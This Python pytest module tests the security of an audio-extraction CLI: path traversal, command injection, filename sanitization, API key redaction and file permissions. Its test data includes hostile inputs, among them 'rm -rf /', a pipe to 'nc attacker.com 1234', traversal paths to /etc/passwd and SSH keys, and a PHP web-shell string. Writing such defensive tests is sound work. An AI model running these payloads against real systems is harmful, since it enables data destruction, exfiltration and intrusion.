"""
Security Testing Suite for audio-extraction-analysis.

This module provides comprehensive end-to-end security testing to ensure the application
is protected against common security vulnerabilities and attack vectors.

Security Testing Coverage:
--------------------------

1. **Input Validation & Sanitization**
   - Path traversal attacks (directory climbing, encoded paths)
   - Command injection attempts (shell metacharacters, command chaining)
   - Filename sanitization (special chars, null bytes, control chars)
   - File size validation and limits
   - Unicode handling security (zero-width chars, RTL override, emojis)

2. **Output Sanitization & Data Protection**
   - API key redaction in logs and error messages
   - Output content sanitization (XSS prevention, code injection)
   - Information disclosure prevention in error messages
   - File permission enforcement on generated files
   - Temporary file cleanup and lifecycle management

3. **API Key Security**
   - Environment variable isolation between operations
   - API key validation and format checking
   - Secure storage verification (no plaintext in outputs)
   - Prevention of key exposure in logs/errors

4. **File System Security**
   - Symbolic link handling and validation
   - Directory traversal prevention in output paths
   - Protection against overwriting system files
   - Safe path resolution and canonicalization

Testing Approach:
-----------------
Each test class focuses on a specific security domain and uses a combination of:
- Malicious input injection to test boundary conditions
- Mock objects to simulate attack scenarios safely
- Output validation to ensure no sensitive data leakage
- File system checks for permission and access controls

All tests are designed to verify that the application fails securely when presented
with malicious input, providing generic error messages without exposing internal
system details or sensitive information.
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from .base import CLITestMixin, E2ETestBase, MockProviderMixin, SecurityTestMixin
from .test_data_manager import TestDataManager


class TestInputValidation(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """
    Test input validation and sanitization across all user-controllable inputs.

    This test class verifies that the application properly validates and sanitizes
    user-provided input data to prevent security vulnerabilities including:

    - **Path Traversal**: Tests directory climbing attacks using various encoding
      techniques (URL encoding, double slashes, backslashes) to ensure the app
      cannot be tricked into accessing files outside allowed directories.

    - **Command Injection**: Validates that shell metacharacters and command
      chaining sequences in filenames don't lead to arbitrary command execution.

    - **Filename Sanitization**: Ensures special characters, control characters,
      null bytes, and other dangerous filename components are properly handled.

    - **Size Limits**: Verifies that extremely long filenames and large files
      are rejected or handled gracefully without causing DoS conditions.

    - **Unicode Security**: Tests Unicode-specific attack vectors including
      zero-width characters, right-to-left override, and encoding exploits.

    All tests verify that the application fails securely with appropriate error
    messages that don't expose internal system details.
    """

    @classmethod
    def setup_class(cls):
        """
        Setup test data for security testing.

        Initializes the test data manager and generates all required test files
        that will be used across security tests. This includes various file types
        and sizes needed to validate security controls.
        """
        cls.test_data_manager = TestDataManager()
        cls.test_files = cls.test_data_manager.generate_all_test_files()

    def test_path_traversal_prevention(self):
        """
        Test prevention of path traversal attacks using various techniques.

        Validates that the application properly rejects attempts to access files
        outside the intended directories using:
        - Unix-style directory traversal (../)
        - Windows-style directory traversal (..\\)
        - Absolute paths (/etc/passwd)
        - URL-encoded traversal sequences (%2f)
        - Double-slash obfuscation (....//)

        Ensures error messages are generic and don't expose sensitive system paths.
        """
        # Collection of path traversal attack vectors using different techniques
        malicious_paths = [
            "../../../etc/passwd",  # Unix-style directory climbing
            "..\\..\\..\\windows\\system32\\config\\sam",  # Windows-style traversal
            "/etc/passwd",  # Absolute path to sensitive file
            "../../../../root/.ssh/id_rsa",  # SSH private key access attempt
            "..%2f..%2f..%2fetc%2fpasswd",  # URL-encoded traversal (bypass filters)
            "....//....//....//etc//passwd",  # Double-slash obfuscation
        ]

        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                # Test with extract command
                result = self.run_extract_command(input_file=malicious_path)

                # The attack should fail - we should never successfully access these paths
                assert not result.success, f"Path traversal attack should fail: {malicious_path}"

                # Error should indicate file not found or invalid path, not expose system info
                error_msg = result.error.lower()

                # Critical security check: error messages must not leak system path information
                # Exposing paths like "/etc/" or "C:\Windows" helps attackers map the system
                sensitive_paths = ["/etc/", "/root/", "/var/", "c:\\windows", "system32"]
                for sensitive_path in sensitive_paths:
                    assert (
                        sensitive_path not in error_msg
                    ), f"Error message exposes sensitive path: {error_msg}"

                # Error should be generic (file not found) rather than revealing the actual issue
                # This prevents attackers from distinguishing between validation failures
                expected_errors = ["not found", "no such file", "invalid", "access denied"]
                assert any(
                    expected in error_msg for expected in expected_errors
                ), f"Unexpected error message for path traversal: {error_msg}"

    def test_command_injection_prevention(self):
        """
        Test prevention of command injection attacks in filename handling.

        Verifies that shell metacharacters and command chaining sequences in
        filenames cannot be exploited to execute arbitrary commands. Tests:
        - Command chaining (;, &&, ||)
        - Command substitution ($(), ``)
        - Piping (|)
        - SQL injection attempts in filenames
        - Background execution (&)

        Ensures failures are due to file validation, not command execution errors.
        """
        # Command injection attack vectors using various shell metacharacters
        injection_attempts = [
            "file.mp4; rm -rf /",  # Command chaining with semicolon
            "file.mp4 && cat /etc/passwd",  # AND operator for command chaining
            "file.mp4 | nc attacker.com 1234",  # Piping to network command (data exfiltration)
            "file.mp4 $(whoami)",  # Command substitution (modern syntax)
            "file.mp4 `id`",  # Command substitution (backtick syntax)
            "file.mp4'; DROP TABLE users; --",  # SQL injection attempt in filename
            "file.mp4 & calc.exe",  # Windows background execution
            "file.mp4 || cat /etc/hosts",  # OR operator for command chaining
        ]

        for injection_attempt in injection_attempts:
            with self.subTest(injection=injection_attempt):
                # Test with extract command
                result = self.run_extract_command(input_file=injection_attempt)

                # Command injection should be prevented - the operation must fail
                assert not result.success, f"Command injection should fail: {injection_attempt}"

                # Critical: error should be about file validation, not command execution
                # If error mentions "command", "shell", etc., it suggests the app tried to execute it
                error_msg = result.error.lower()
                command_indicators = ["executed", "command", "shell", "bash", "cmd"]

                for indicator in command_indicators:
                    assert (
                        indicator not in error_msg
                    ), f"Error suggests command execution: {error_msg}"

    def test_filename_sanitization(self):
        """
        Test proper sanitization of filenames containing special characters.

        Validates handling of potentially dangerous filename components including:
        - Special characters (@#$%^&*())
        - Null bytes (\\x00) for truncation attacks
        - Control characters (\\n\\r\\t)
        - XSS-style content in filenames
        - Right-to-left override characters (\\u202e)
        - Double extensions (.mp4.exe)
        - Windows reserved names (CON, AUX, etc.)

        Ensures the application either sanitizes these safely or fails gracefully
        without exposing internal error details.
        """
        # Collection of special characters and dangerous filename patterns
        special_filenames = [
            "test@#$%^&*().mp4",  # Special characters that might break parsing
            "test file with spaces.mp4",  # Spaces (can break shell commands)
            "test\x00null.mp4",  # Null byte (can truncate strings in C-based libs)
            "test\n\r\t.mp4",  # Control characters (newline, carriage return, tab)
            "test<script>alert('xss')</script>.mp4",  # XSS attempt in filename
            "test\u202e.mp4",  # Right-to-left override (can hide real extension)
            "test.mp4.exe",  # Double extension (social engineering)
            "CON.mp4",  # Windows reserved device name
            "aux.mp4",  # Windows reserved device name
        ]

        for filename in special_filenames:
            with self.subTest(filename=filename):
                # Create a temporary file with the special name (if possible)
                try:
                    temp_file = self.temp_dir / filename
                    temp_file.write_bytes(b"dummy content")

                    output_file = self.output_dir / f"sanitized_{hash(filename)}.mp3"

                    result = self.run_extract_command(input_file=temp_file, output_file=output_file)

                    # Should either succeed with proper sanitization or fail gracefully
                    if not result.success:
                        error_msg = result.error.lower()
                        # Should not expose internal system details
                        assert "internal" not in error_msg
                        assert "system" not in error_msg
                        assert "error code" not in error_msg

                except (OSError, ValueError):
                    # Some filenames cannot be created on certain systems
                    pytest.skip(f"Cannot create file with name: {filename}")

    def test_large_filename_handling(self):
        """Test handling of excessively long filenames."""
        # Create extremely long filename
        long_filename = "a" * 1000 + ".mp4"

        result = self.run_extract_command(input_file=long_filename)

        assert not result.success, "Extremely long filename should be rejected"

        error_msg = result.error.lower()
        # Should fail gracefully without system errors
        acceptable_errors = ["not found", "invalid", "too long", "name too long"]
        assert any(
            error in error_msg for error in acceptable_errors
        ), f"Unexpected error for long filename: {error_msg}"

    def test_unicode_filename_security(self):
        """
        Test security aspects of Unicode filename handling.

        Validates that the application properly handles Unicode characters in
        filenames without encoding vulnerabilities or crashes. Tests:
        - Non-Latin scripts (Cyrillic, Chinese, Japanese)
        - Emoji characters
        - Zero-width joiner (invisible character)
        - Byte order mark (BOM)

        Ensures that Unicode handling doesn't cause encoding errors that could
        expose internal system details or crash the application.
        """
        # Unicode characters that may cause encoding issues or security vulnerabilities
        unicode_filenames = [
            "test_файл.mp4",  # Cyrillic characters (multi-byte encoding)
            "test_文件.mp4",  # Chinese characters (CJK, complex encoding)
            "test_テスト.mp4",  # Japanese characters (multiple encodings possible)
            "test_🎵🎧.mp4",  # Emoji (UTF-8 4-byte sequences)
            "test_\u200d.mp4",  # Zero-width joiner (invisible, can hide content)
            "test_\ufeff.mp4",  # Byte order mark (BOM, can cause encoding confusion)
        ]

        for filename in unicode_filenames:
            with self.subTest(filename=filename):
                result = self.run_extract_command(input_file=filename)

                # Should fail gracefully without encoding errors
                if not result.success:
                    error_msg = result.error.lower()
                    # Check that error doesn't expose encoding implementation details
                    # Such errors could reveal internal library choices or Python version
                    encoding_errors = ["encoding", "unicode", "decode", "ascii"]

                    for error_type in encoding_errors:
                        assert (
                            error_type not in error_msg
                        ), f"Unicode filename caused encoding error: {error_msg}"

    def test_file_size_limits(self):
        """Test file size validation."""
        # Create test file that reports large size
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        # Test with mocked large file size
        with patch("pathlib.Path.stat") as mock_stat:
            mock_stat.return_value.st_size = 10 * 1024 * 1024 * 1024  # 10GB

            result = self.run_extract_command(input_file=self.test_files["short"])

            # Should either succeed or fail with size limit message
            if not result.success:
                error_msg = result.error.lower()
                size_related = any(
                    keyword in error_msg
                    for keyword in ["size", "large", "limit", "exceeded", "too big"]
                )

                if size_related:
                    # Good - size limits are enforced
                    pass
                else:
                    # File might not actually be large in test environment
                    pass


class TestOutputSanitization(E2ETestBase, CLITestMixin, SecurityTestMixin, MockProviderMixin):
    """
    Test output sanitization and protection of sensitive data in application outputs.

    This test class ensures that the application properly sanitizes all output data
    and prevents exposure of sensitive information through various channels:

    - **API Key Protection**: Verifies that API keys are never exposed in logs,
      error messages, stack traces, or any other output channel, even when errors
      occur during API operations.

    - **Content Sanitization**: Tests that output content is properly sanitized
      to prevent XSS attacks, code injection, and other content-based exploits
      in JSON, text, and other output formats.

    - **Information Disclosure**: Ensures error messages provide generic feedback
      without exposing internal paths, system configuration, stack traces, or
      other implementation details that could aid attackers.

    - **File Permissions**: Validates that generated output files have appropriate
      permissions (not world-writable, readable by owner) and follow security
      best practices for the operating system.

    - **Temporary File Management**: Confirms that temporary files created during
      processing are properly cleaned up and don't leak sensitive data to the
      file system.

    Uses mocking to safely test error conditions and edge cases without actually
    exposing sensitive data during the test run.
    """

    def setup_method(self):
        """
        Setup for each test method in output sanitization tests.

        Initializes the test environment with a test API key to enable testing
        of API key redaction and security features. The test key is intentionally
        visible here as it's used to verify the application properly redacts it
        from all outputs.
        """
        super().setup_method()
        self.set_test_env(DEEPGRAM_API_KEY="test_deepgram_key_12345")

    def test_api_key_redaction_in_logs(self):
        """
        Test that API keys are not exposed in logs or error messages.

        Simulates an error condition where an exception message contains the API key,
        then verifies that the application properly redacts the key before displaying
        it to the user. Checks for:
        - Full API key exposure
        - Partial API key exposure (key fragments)

        This is critical to prevent credential leakage through error logs.
        """
        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")

        # Mock transcription service to raise an error that might expose API key
        with patch("src.services.transcription.TranscriptionService") as mock_service:
            api_key = "test_deepgram_key_12345"
            mock_service.return_value.transcribe.side_effect = Exception(
                f"API request failed with key {api_key}"
            )

            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"], provider="deepgram"
            )

            # Should fail but not expose API key
            assert not result.success, "Transcription should fail with mocked error"

            # Check all output for API key exposure
            all_output = (result.output + result.error).lower()

            # Should not contain the actual API key
            assert api_key.lower() not in all_output, "API key exposed in output"

            # Should not contain partial API key, but exclude legitimate provider names
            # Provider names may legitimately appear in error messages
            known_provider_names = {"deepgram", "elevenlabs", "whisper", "parakeet", "auto"}
            key_parts = api_key.split("_")
            for part in key_parts:
                if len(part) > 5:  # Only check meaningful parts
                    # Skip provider names that are legitimate in error messages
                    if part.lower() in known_provider_names:
                        continue
                    # Check for key parts that appear in suspicious contexts
                    # (e.g., "key_12345" pattern or standalone long alphanumeric strings)
                    if part.lower() == "key" or part.isdigit():
                        # These are clearly part of the key pattern
                        assert part.lower() not in all_output, f"API key part '{part}' exposed"
                    elif len(part) > 10:  # Long alphanumeric strings are suspicious
                        # Check if it appears in a context that suggests it's from the key
                        # (e.g., near "key" or "token" or in error messages about credentials)
                        suspicious_contexts = [
                            f"key {part.lower()}",
                            f"{part.lower()} key",
                            f"token {part.lower()}",
                            f"{part.lower()} token",
                            f"api {part.lower()}",
                            f"credential {part.lower()}",
                        ]
                        # Only fail if the part appears in a suspicious context
                        if any(ctx in all_output for ctx in suspicious_contexts):
                            raise AssertionError(
                                f"API key part '{part}' exposed in suspicious context"
                            )

    def test_output_content_sanitization(self):
        """Test that output content is properly sanitized."""
        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")

        # Mock transcription with potentially dangerous content
        dangerous_transcript = {
            "transcript": "<script>alert('xss')</script>Hello world",
            "speakers": [
                {"speaker": 0, "text": "<?php system($_GET['cmd']); ?>", "start": 0.0, "end": 2.0}
            ],
            "metadata": {"duration": 10.0, "confidence": 0.95},
        }

        output_file = self.output_dir / "sanitized_transcript.json"

        with patch("src.services.transcription.TranscriptionService") as mock_service:
            mock_service.return_value.transcribe.return_value = dangerous_transcript

            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"],
                provider="deepgram",
                output_file=output_file,
            )

        if result.success and output_file.exists():
            output_content = output_file.read_text()

            # Check for proper sanitization
            sanitization_results = self.validate_output_sanitization(output_content)

            assert sanitization_results["no_script_tags"], "Script tags not properly sanitized"
            assert sanitization_results["no_control_chars"], "Control characters not sanitized"
            assert sanitization_results["reasonable_length"], "Output length not limited"

    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information."""
        sensitive_scenarios = [
            # Nonexistent file
            "/nonexistent/path/file.mp4",
            # Permission denied scenario
            "/root/.ssh/id_rsa",
            # System directories
            "/etc/shadow",
        ]

        for scenario in sensitive_scenarios:
            with self.subTest(scenario=scenario):
                result = self.run_extract_command(input_file=scenario)

                assert not result.success, f"Should fail for scenario: {scenario}"

                error_msg = result.error.lower()

                # Should not expose internal paths or system information
                sensitive_info = [
                    "/usr/",
                    "/var/",
                    "/etc/",
                    "/root/",
                    "c:\\windows",
                    "system32",
                    "program files",
                    "internal error",
                    "stack trace",
                    "traceback",
                ]

                for sensitive in sensitive_info:
                    assert (
                        sensitive not in error_msg
                    ), f"Error message exposes sensitive info: {sensitive} in {error_msg}"

    def test_output_file_permissions(self):
        """
        Test that output files have appropriate permissions.

        Validates that generated output files follow security best practices for
        file permissions:
        - Not world-writable (prevents unauthorized modification)
        - Readable by owner (ensures accessibility)
        - On Unix systems, checks for standard permission patterns (644, 600, etc.)

        Improper permissions could allow unauthorized users to modify or access
        sensitive output data.
        """
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        input_file = self.test_files["short"]
        output_file = self.output_dir / "permission_test.mp3"

        result = self.run_extract_command(input_file=input_file, output_file=output_file)

        if result.success and output_file.exists():
            # Check file permissions for security best practices
            file_mode = output_file.stat().st_mode

            # Critical security check: world-writable files can be modified by any user
            # This could allow malicious users to replace content or inject code
            assert not (file_mode & 0o002), "Output file should not be world-writable"

            # Verify owner can read their own output file
            assert file_mode & 0o400, "Output file should be readable by owner"

            # On Unix systems, check specific permission patterns
            if os.name == "posix":
                # Should have reasonable permissions (e.g., 644 or 600)
                # 644 = rw-r--r-- (owner write, group/others read)
                # 600 = rw------- (owner only)
                perms = file_mode & 0o777
                acceptable_perms = [0o644, 0o600, 0o640, 0o664]
                assert perms in acceptable_perms, f"Unexpected file permissions: {oct(perms)}"

    def test_temporary_file_cleanup(self):
        """
        Test that temporary files are properly cleaned up after processing.

        Verifies that the application doesn't leave sensitive data in temporary
        files after operations complete. Checks:
        - No new temporary files remain after processing
        - Filters for application-related temp files (audio, extract, ffmpeg)
        - Validates cleanup in system temp directories

        Leftover temporary files could leak sensitive data or consume disk space.
        """
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        input_file = self.test_files["short"]

        # Count initial temporary files
        temp_dirs = (
            [tempfile.gettempdir(), "/tmp"] if os.path.exists("/tmp") else [tempfile.gettempdir()]
        )
        initial_temp_files = set()

        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                initial_temp_files.update(os.listdir(temp_dir))

        # Run extraction
        output_file = self.output_dir / "temp_cleanup_test.mp3"
        self.run_extract_command(input_file=input_file, output_file=output_file)

        # Check for leftover temporary files
        final_temp_files = set()
        for temp_dir in temp_dirs:
            if os.path.exists(temp_dir):
                final_temp_files.update(os.listdir(temp_dir))

        new_temp_files = final_temp_files - initial_temp_files

        # Filter out unrelated temporary files
        related_temp_files = [
            f
            for f in new_temp_files
            if "audio" in f.lower()
            or "extract" in f.lower()
            or "ffmpeg" in f.lower()
            or "tmp" in f.lower()
        ]

        assert len(related_temp_files) == 0, f"Temporary files not cleaned up: {related_temp_files}"


class TestAPIKeySecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """
    Test comprehensive API key security throughout the application lifecycle.

    This test class focuses specifically on the security aspects of API key management,
    ensuring that sensitive credentials are properly protected at all stages:

    - **Environment Isolation**: Verifies that API keys are properly isolated between
      different operations and that changing environment variables doesn't cause
      key leakage between contexts or operations.

    - **Validation & Sanitization**: Tests that API keys are validated for format
      and content, rejecting keys with dangerous characters, excessive length,
      or malformed structure that could lead to injection attacks.

    - **Secure Storage**: Confirms that API keys are never stored in plaintext in
      output files, logs, configuration files, or any persistent storage that
      could be accessed by unauthorized users.

    - **Exposure Prevention**: Ensures API keys (including partial keys and key
      fragments) are never exposed in error messages, debug output, stack traces,
      or any other user-visible output channel.

    Uses mocking to test API key handling without requiring actual API credentials
    or making external API calls during testing.
    """

    def test_api_key_environment_isolation(self):
        """Test that API keys are properly isolated between operations."""
        # Set API key for first operation
        self.set_test_env(DEEPGRAM_API_KEY="first_api_key")

        # Mock first operation
        with patch("src.providers.factory.TranscriptionProviderFactory") as mock_factory:
            mock_factory.get_configured_providers.return_value = ["deepgram"]
            first_result = mock_factory.get_configured_providers()

        # Change API key
        self.set_test_env(DEEPGRAM_API_KEY="second_api_key")

        # Mock second operation
        with patch("src.providers.factory.TranscriptionProviderFactory") as mock_factory:
            mock_factory.get_configured_providers.return_value = ["deepgram"]
            second_result = mock_factory.get_configured_providers()

        # Both should work independently
        assert first_result == ["deepgram"]
        assert second_result == ["deepgram"]

    def test_api_key_validation(self):
        """Test API key validation and sanitization."""
        # Invalid API key patterns that should be rejected
        invalid_keys = [
            "",  # Empty key (no authentication)
            "   ",  # Whitespace only (effectively empty)
            "invalid key",  # Spaces in key (malformed)
            "key\nwith\nnewlines",  # Control characters (injection attempt)
            "a" * 1000,  # Extremely long key (buffer overflow attempt)
            "<script>alert('xss')</script>",  # XSS attempt in API key
        ]

        for invalid_key in invalid_keys:
            with self.subTest(key=invalid_key):
                self.set_test_env(DEEPGRAM_API_KEY=invalid_key)

                # Try to use the invalid key
                with patch("src.providers.factory.TranscriptionProviderFactory") as mock_factory:
                    mock_factory.validate_provider.side_effect = ValueError("Invalid API key")

                    with pytest.raises(ValueError, match="Invalid API key"):
                        mock_factory.validate_provider("deepgram")

    def test_api_key_storage_security(self):
        """Test that API keys are not stored insecurely."""
        self.set_test_env(DEEPGRAM_API_KEY="secure_test_key_12345")

        if "audio_only" not in self.test_files:
            pytest.skip("Audio test file not available")

        # Mock transcription to complete successfully
        with patch("src.services.transcription.TranscriptionService") as mock_service:
            mock_service.return_value.transcribe.return_value = self.mock_successful_transcription()

            output_file = self.output_dir / "api_key_test.json"

            result = self.run_transcribe_command(
                input_file=self.test_files["audio_only"],
                provider="deepgram",
                output_file=output_file,
            )

        if result.success and output_file.exists():
            # Check that API key is not stored in output
            output_content = output_file.read_text()

            assert "secure_test_key_12345" not in output_content, "API key found in output file"

            # Check for partial key exposure
            key_fragments = ["secure_test", "key_12345", "test_key"]
            for fragment in key_fragments:
                assert (
                    fragment not in output_content
                ), f"API key fragment '{fragment}' found in output"


class TestFileSystemSecurity(E2ETestBase, CLITestMixin, SecurityTestMixin):
    """
    Test file system security and safe file operations.

    This test class validates that the application safely interacts with the file
    system and prevents unauthorized access or modification of files:

    - **Symbolic Link Handling**: Tests how the application handles symbolic links
      to ensure they cannot be exploited for privilege escalation, unauthorized
      file access, or time-of-check-time-of-use (TOCTOU) race conditions.

    - **Directory Traversal Prevention**: Verifies that output paths cannot use
      directory traversal sequences (.., ~, absolute paths) to write files to
      unauthorized locations outside the intended output directory.

    - **File Overwrite Protection**: Ensures the application cannot be tricked
      into overwriting critical system files, configuration files, or other
      important files that should never be modified by the application.

    - **Path Canonicalization**: Confirms that all file paths are properly
      resolved and canonicalized before use to prevent bypassing security
      checks through symbolic links, relative paths, or other path manipulation
      techniques.

    All tests verify that the application operates within its designated file
    system boundaries and fails securely when presented with malicious paths.
    """

    def test_symlink_handling(self):
        """Test handling of symbolic links."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        # Create a symbolic link to test file
        try:
            source_file = self.test_files["short"]
            symlink_file = self.temp_dir / "test_symlink.mp4"
            symlink_file.symlink_to(source_file)

            output_file = self.output_dir / "symlink_test.mp3"

            result = self.run_extract_command(input_file=symlink_file, output_file=output_file)

            # Should either follow symlink safely or reject it
            if not result.success:
                error_msg = result.error.lower()
                # If rejected, should be for security reasons
                security_keywords = ["symlink", "symbolic", "link", "security"]
                if any(keyword in error_msg for keyword in security_keywords):
                    # Good - symlinks are properly handled
                    pass
                else:
                    # Might be rejected for other reasons (file not found, etc.)
                    pass
            else:
                # If successful, output should be created normally
                assert output_file.exists(), "Symlink processing should create output"

        except (OSError, NotImplementedError):
            pytest.skip("Symbolic links not supported on this system")

    def test_directory_traversal_in_output(self):
        """Test prevention of directory traversal in output paths."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        input_file = self.test_files["short"]

        # Malicious output paths attempting to write outside allowed directories
        malicious_outputs = [
            "../../../etc/passwd",  # Unix directory traversal
            "..\\..\\..\\windows\\system32\\malicious.mp3",  # Windows traversal to system directory
            "/etc/shadow",  # Absolute path to sensitive file
            "/root/malicious.mp3",  # Absolute path to root's home
            "~/../../etc/hosts",  # Tilde expansion with traversal
        ]

        for malicious_output in malicious_outputs:
            with self.subTest(output=malicious_output):
                result = self.run_extract_command(
                    input_file=input_file, output_file=malicious_output
                )

                # Should either sanitize path or reject it
                if result.success:
                    # If successful, should not have written to malicious location
                    malicious_path = Path(malicious_output)
                    if malicious_path.exists():
                        # If file exists, it should be in a safe location
                        # Use resolve() to canonicalize paths and prevent symlink tricks
                        resolved_path = malicious_path.resolve()
                        temp_dir_resolved = self.temp_dir.resolve()

                        # Security check: verify the file is within approved directories
                        # This prevents directory traversal from writing outside the sandbox
                        safe_parents = [temp_dir_resolved, self.output_dir.resolve()]
                        is_safe = any(
                            str(resolved_path).startswith(str(safe_parent))
                            for safe_parent in safe_parents
                        )

                        assert (
                            is_safe or not malicious_path.exists()
                        ), f"Malicious output path created: {resolved_path}"
                else:
                    # If failed, should be due to path validation
                    error_msg = result.error.lower()
                    path_errors = ["invalid", "path", "directory", "access", "permission"]
                    assert any(
                        error in error_msg for error in path_errors
                    ), f"Unexpected error for malicious output path: {error_msg}"

    def test_file_overwrite_protection(self):
        """Test protection against overwriting important files."""
        if "short" not in self.test_files:
            pytest.skip("Short test file not available")

        input_file = self.test_files["short"]

        # Critical system files that should never be overwritten by the application
        system_files = [
            "/etc/passwd",  # Unix user database
            "/etc/hosts",  # DNS resolution file
            "/bin/sh",  # System shell binary
            "C:\\Windows\\System32\\drivers\\etc\\hosts",  # Windows DNS resolution
            "C:\\Windows\\System32\\kernel32.dll",  # Critical Windows system library
        ]

        for system_file in system_files:
            with self.subTest(file=system_file):
                # Only test if file actually exists
                if Path(system_file).exists():
                    result = self.run_extract_command(
                        input_file=input_file, output_file=system_file
                    )

                    # Should fail to overwrite system files
                    assert not result.success, f"Should not overwrite system file: {system_file}"

                    error_msg = result.error.lower()
                    protection_keywords = ["permission", "access", "denied", "protected"]
                    assert any(
                        keyword in error_msg for keyword in protection_keywords
                    ), f"Unexpected error when trying to overwrite {system_file}: {error_msg}"
